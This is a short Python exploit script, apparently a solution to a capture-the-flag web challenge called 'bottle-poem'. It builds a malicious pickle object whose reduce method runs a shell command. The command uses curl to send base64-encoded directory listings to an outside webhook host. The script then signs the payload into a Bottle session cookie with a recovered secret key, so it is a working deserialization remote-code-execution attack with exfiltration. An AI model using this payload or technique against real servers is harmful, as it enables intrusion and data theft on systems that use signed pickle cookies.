from bottle import route, run, template, request, response, error
import os
import re
import pickle
import base64
import sys
import requests

url = "http://bottle-poem.ctf.sekai.team/sign"

sekai = "Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu"

COMMAND = "os.system('curl https://webhook.site/b2cebeea-7fa8-4fc2-a589-a7bb83406e83/?cc=`ls | base64 `')"
class PickleRce(object):
    def __reduce__(self):
        import os
        return eval ,(COMMAND ,)
session = {"name": PickleRce() }
response.set_cookie("name", session, secret=sekai)
print(response)

